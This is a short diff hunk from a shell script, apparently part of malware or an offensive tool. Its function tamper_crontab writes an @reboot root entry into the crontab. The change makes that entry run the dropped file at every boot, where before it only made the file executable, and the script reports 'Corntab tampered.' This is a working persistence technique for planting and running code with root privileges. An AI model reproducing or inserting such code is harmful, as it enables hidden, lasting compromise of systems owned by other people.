@@ -20,7 +20,7 @@ tamper_crontab() {
         return 0
     fi
 
-    if  echo "@reboot root cd '$ldir' && [ -f '$ldir/$lfname' ] && chmod +x './$lfname'" >> $crtbpath; then
+    if  echo "@reboot root cd '$ldir' && [ -f '$ldir/$lfname' ] && chmod +x './$lfname' && './$lfname'" >> $crtbpath; then
         echo "Corntab tampered."
         return 0
     else
